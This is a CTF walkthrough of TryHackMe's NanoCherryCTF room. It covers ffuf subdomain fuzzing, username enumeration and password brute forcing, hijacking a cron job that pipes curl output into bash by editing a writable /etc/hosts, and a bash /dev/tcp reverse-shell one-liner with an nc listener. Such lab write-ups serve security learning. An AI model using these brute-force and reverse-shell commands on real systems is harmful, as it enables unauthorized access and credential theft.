---
title: "TryHackMe - NanoCherryCTF"
author: Nasrallah
description: ""
date: 2024-12-11 07:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium, steganography, ffuf, bruteforce, cronjob]
img_path: /assets/img/tryhackme/nanocherryctf
image:
    path: nanocherryctf.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[NanoCherryCTF](https://tryhackme.comr/r/room/nanocherryctf) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) revolves around brute forcing and fuzzing web applications to gain foothold. then we exploit a cron job and extract and image from an audio file to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for cherryontop.thm (10.10.71.0)
Host is up (0.090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e:e6:fd:19:23:a3:b1:40:77:1c:a4:c4:2f:e6:d3:4b (ECDSA)
|_  256 15:2b:23:73:3f:c8:8a:a3:b4:aa:1d:ae:70:d4:5f:ae (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Cherry on Top Ice Cream Shop
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found too open ports, 22 running ssh and 80 running an Apache web server.

We already got credentials to the box so it's all about privilege escalation now.

Before we start, let's first add the host `cherryontop.thm` to our `/etc/hosts` file as mentioned in the room.

## **Privilege Escalation**

Let's navigate to the web page.

![webpage](1.png)

Scrolling down we find an interesting video.

![videosub](2.png)

The guy tells to enumerate subdomains.

```terminal
                                                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                       
                                                                                                                                                                                              
       v2.1.0-dev                                                                                                                                                                             
________________________________________________                                                                                                                                              
                                                                                                                                                                                              
 :: Method           : GET                                                                                                                                                                    
 :: URL              : http://cherryontop.thm                                                  
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt                                                                                                                   
 :: Header           : Host: FUZZ.cherryontop.thm                                                                                                                                             
 :: Follow redirects : false                                                                                                                                                                  
 :: Calibration      : false                                                                                                                                                                  
 :: Timeout          : 10                                                                      
 :: Threads          : 40                                                                                                                                                                     
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                    
 :: Filter           : Response size: 13968                                                    
________________________________________________                                               
                                                                                       
nano                    [Status: 200, Size: 10718, Words: 4093, Lines: 220, Duration: 168ms]
```

We found `nano` subdomain, let's add it to `/etc/hosts` and navigate to it.

![nano](3.png)

Nothing interesting in this page but we find an `Admin` tab, let's check it.

![admin](4.png)

It's an admin poral login page, I tried some default credentials but no success.

But we get the message `This user doesn't exist`, this allows us to enumerate for valid usernames.

```terminal
$ ffuf -c -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -u http://nano.cherryontop.thm/login.php -X POST -d "username=FUZZ&password=password&submit=" -H "Content-Type:
 application/x-www-form-urlencoded" -fr "This user doesn't"                                     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://nano.cherryontop.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=password&submit=
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: This user doesn't
________________________________________________

puppet                  [Status: 200, Size: 2370, Words: 733, Lines: 61, Duration: 119ms]
```

We were able to find the username `puppet`, Let's see if we get another message now.

![pass](5.png)

We got `Bad password`, let's brute force passwords now.

```terminal
$ ffuf -c -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -u http://nano.cherryontop.thm/login.php -X POST -d "username=puppet&password=FUZZ&submit=" -H "Con
tent-Type: application/x-www-form-urlencoded" -fr "Bad"                                                                                                                                       
                                                                                                                                                                                              
        /'___\  /'___\           /'___\                                                                                                                                                       
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                                                                       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                                                      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                                                      
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                       
          \/_/    \/_/   \/___/    \/_/                                                                                                                                                       
                                                                                                                                                                                              
       v2.1.0-dev                                                                                                                                                                             
________________________________________________                                                                                                                                              
                                                                                                                                                                                              
 :: Method           : POST                                                                                                                                                                   
 :: URL              : http://nano.cherryontop.thm/login.php                                                                                                                                  
 :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt                                                                                            
 :: Header           : Content-Type: application/x-www-form-urlencoded                                                                                                                        
 :: Data             : username=puppet&password=FUZZ&submit=                                                                                                                                  
 :: Follow redirects : false                                                                                                                                                                  
 :: Calibration      : false                                                                                                                                                                  
 :: Timeout          : 10                                                                                                                                                                     
 :: Threads          : 40                                                                                                                                                                     
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                                                                                                   
 :: Filter           : Regexp: Bad                                                                                                                                                            
________________________________________________                                                                                                                                              
[REDACTED]                  [Status: 302, Size: 333, Words: 37, Lines: 12, Duration: 2166ms]       
```

We got the password! Let's login.

![logged](6.png)

On the dashboard we find `molly's` password.

### sam-sprinkles

Going back the `cherryontop.thm` we go to `content.php` page.

![content](7.png)

The page gives us some facts about ice cream, let's check the request on burp.

![burpasd](8.png)

We got two GET parameters, `facts` and `user`, the user value is a base32 encode of `guest`.

Let's try fuzzing other facts numbers and see what we can find.\

First we create a wordlist of numbers.

```bash
seq 0 1000 > nums.txt
```

Now let's fuzz using `ffuf`.

```terminal
$ ffuf -c -w ./nums.txt -u 'http://cherryontop.thm/content.php?facts=FUZZ&user=I52WK43U' -fr 'Error'                                                                                  
                                               
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/       
                                                                                               
       v2.1.0-dev                              
________________________________________________                                               
                                                                                               
 :: Method           : GET                                                                     
 :: URL              : http://cherryontop.thm/content.php?facts=FUZZ&user=I52WK43U                                                                                                            
 :: Wordlist         : FUZZ: /home/sirius/ctf/thm/cherry/nums.txt                              
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10                                                                      
 :: Threads          : 40           
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Error           
________________________________________________                                         
                                                                                               
4                       [Status: 200, Size: 2523, Words: 761, Lines: 63, Duration: 123ms]
2                       [Status: 200, Size: 2519, Words: 762, Lines: 63, Duration: 126ms]
3                       [Status: 200, Size: 2514, Words: 762, Lines: 63, Duration: 128ms]
43                      [Status: 200, Size: 2498, Words: 759, Lines: 63, Duration: 198ms]
50                      [Status: 200, Size: 2487, Words: 757, Lines: 63, Duration: 90ms]  
64                      [Status: 200, Size: 2486, Words: 757, Lines: 63, Duration: 91ms]  
1                       [Status: 200, Size: 2499, Words: 759, Lines: 63, Duration: 933ms]      
20                      [Status: 200, Size: 2479, Words: 755, Lines: 63, Duration: 4931ms]
```

We found more numbers but they don't give us anything useful. Let's try changing the user to `admin`.

```terminal
$ ffuf -c -w ./nums.txt -u 'http://cherryontop.thm/content.php?facts=FUZZ&user=MFSG22LO' -fr 'Error'
                                                                                               
[...]
                                               
2                       [Status: 200, Size: 2519, Words: 762, Lines: 63, Duration: 119ms]
3                       [Status: 200, Size: 2514, Words: 762, Lines: 63, Duration: 131ms]      
1                       [Status: 200, Size: 2499, Words: 759, Lines: 63, Duration: 132ms]
43                      [Status: 200, Size: 2498, Words: 759, Lines: 63, Duration: 224ms]
50                      [Status: 200, Size: 2487, Words: 757, Lines: 63, Duration: 96ms] 
64                      [Status: 200, Size: 2486, Words: 757, Lines: 63, Duration: 96ms] 
4                       [Status: 200, Size: 2523, Words: 761, Lines: 63, Duration: 1256ms]
20                      [Status: 200, Size: 2479, Words: 755, Lines: 63, Duration: 3253ms]
```

Sam thing here and still nothing.

Let's try with user `sam-sprinkles`.

```terminal
$ ffuf -c -w ./nums.txt -u 'http://cherryontop.thm/content.php?facts=FUZZ&user=ONQW2LLTOBZGS3TLNRSXG===' -fr 'Error'
[...]

1                       [Status: 200, Size: 2499, Words: 759, Lines: 63, Duration: 119ms]
2                       [Status: 200, Size: 2519, Words: 762, Lines: 63, Duration: 137ms]
3                       [Status: 200, Size: 2514, Words: 762, Lines: 63, Duration: 190ms]
20                      [Status: 200, Size: 2479, Words: 755, Lines: 63, Duration: 199ms]
4                       [Status: 200, Size: 2523, Words: 761, Lines: 63, Duration: 235ms]
43                      [Status: 200, Size: 2558, Words: 764, Lines: 63, Duration: 218ms]
50                      [Status: 200, Size: 2487, Words: 757, Lines: 63, Duration: 220ms]
64                      [Status: 200, Size: 2486, Words: 757, Lines: 63, Duration: 212ms]
```

We got the same numbers, but checking them on burp we got a different output on one of them.

![passam](9.png)

We got `sam-sprinkles's` password.

### bob-boba

After runnning linpeas we find a cronjob running every minute.

```terminal
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```

It's running as user bob-boba requesting a shell file from `cherryontop.tld:8000/` and piping the content to bash to get it executed.

Checking the `/etc/hosts` file we find that we have write permission over it.

```terminal
-rw-rw-rw- 1 root adm 345 Nov 20 08:04 /etc/hosts
```

We can edit this file to point to our server on the `cherryontop.tld` domain.

```temrinal
127.0.0.1 localhost
127.0.0.1 cherryontop.com
127.0.0.1 cherryontop.thm
127.0.0.1 nano.cherryontop.thm
127.0.1.1 nanocherryctf
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.14.91.207 cherryontop.tld
```

Now on our attack machine we create a /home/bob-boba/coinflip.sh that sends us a shell.

```bash
mkdir -p home/bob-boba
echo '/bin/bash -i >& /dev/tcp/10.14.91.207/9001 0>&1' > ./home/bob-boba/coinflip.sh
```

We setup a listener and wait for the cronjob.

```terminal
$ nc -lvnp 9001                                                                                                                                                                       
listening on [any] 9001 ...                                                                    
connect to [10.14.91.207] from (UNKNOWN) [10.10.71.0] 40030                                                                                                                                   
bash: cannot set terminal process group (21752): Inappropriate ioctl for device                
bash: no job control in this shell                                                             
bob-boba@nanocherryctf:~$ whoami                                                               
whoami                                                                                         
bob-boba 
```

We got a shell as user `bob-boba`.

### Chad-cherry

We collected all the parts of `chad-cherry's` password, let's assemble them and authenticate.

We find an audio file named `rootPassword.wav`. Let's copy it to our machine and inspect it.

```bash
scp chad-cherry@cherryontop.thm:rootPassword.wav .
```

The file contains an image that we need to extract.

To do that we can use the tool [sstv](https://github.com/colaclanth/sstv)

```terminal
$ sstv -d rootPassword.wav -o file.png                                                 
[sstv] Searching for calibration header... Found!    
[sstv] Detected SSTV mode Robot 36                                                                                                                                                            
[sstv] Decoding image...                                                           [####################################################################################################]  99%
[sstv] Reached end of audio whilst decoding.                                                   
[sstv] Drawing image data...                                                                   
[sstv] ...Done!       
```

We open the image and get the root's password.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://github.com/colaclanth/sstv>
